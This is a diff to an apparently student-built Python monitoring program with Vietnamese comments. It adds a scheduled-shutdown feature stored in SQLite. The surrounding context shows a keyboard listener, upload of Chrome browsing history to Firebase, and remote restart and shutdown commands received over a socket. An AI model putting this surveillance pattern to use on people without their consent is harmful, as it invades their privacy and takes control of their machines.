@@ -188,9 +188,55 @@ def get_Chrome_history():
 
     # Đẩy dữ liệu lịch sử duyệt web Chrome lên Firebase
     push_to_firebase(browsing_history, "Chrome")
-           
+def getTimeShutdown():
+    # Kết nối đến cơ sở dữ liệu
+    conn = sqlite3.connect('PBL.db')
+    cursor = conn.cursor()
+
+    # Lấy giá trị cuối cùng từ bảng timeShutDown
+    select_last_value_query = '''
+    SELECT shutdownTime FROM timeShutDown ORDER BY ROWID DESC LIMIT 1;
+    '''
+
+    # Thực thi lệnh SQL
+    cursor.execute(select_last_value_query)
+
+    # Lấy kết quả
+    last_value = cursor.fetchone()
+    return last_value
+def addTimeShutdown(timeShutDown):
+        
+    # Kết nối đến cơ sở dữ liệu và tạo bảng
+    conn = sqlite3.connect('PBL.db')
+    cursor = conn.cursor()
+
+    # Chèn dữ liệu vào bảng user
+    insert_data_query = '''
+    INSERT INTO timeShutDown (shutdownTime) VALUES (?);
+    '''
+    # Thực thi lệnh SQL với dữ liệu cụ thể
+    cursor.execute(insert_data_query, (timeShutDown,))  
+
+    # Lưu thay đổi (commit) vào cơ sở dữ liệu
+    conn.commit()
+
+    # Đóng kết nối
+    conn.close()
+def shutdownByTime(timeShutDown):
+    while True:
+        current_time = datetime.now().strftime('%H:%M')
+        if current_time == timeShutDown:
+                print("Đã đến giờ tắt máy như đã hẹn")
+                # os.system("shutdown /s /t 1")
+        time.sleep(30)
+
+    
 with Listener(on_press=on_press) as parent:
     try:
+        timeShutDown = getTimeShutdown()
+        timeShutDown_thread = threading.Thread(target=shutdownByTime, args =timeShutDown)
+        timeShutDown_thread.start()
+         
         appHistory_thread = threading.Thread(target=getAppHistory)
         appHistory_thread.start()
         while True:
@@ -208,7 +254,9 @@ with Listener(on_press=on_press) as parent:
                 os.system("shutdown /r /t 1")
             elif message == 'shutdown_time':
                 shutdown_time = clientSocket.recv(1024).decode('utf-8')
-                print("Shutdown time: " + shutdown_time)  
+                print("Shutdown time: " + shutdown_time) 
+                addTimeShutdown(shutdown_time)
+                 
                 
     except Exception as e:
         print("Error: " + str(e))
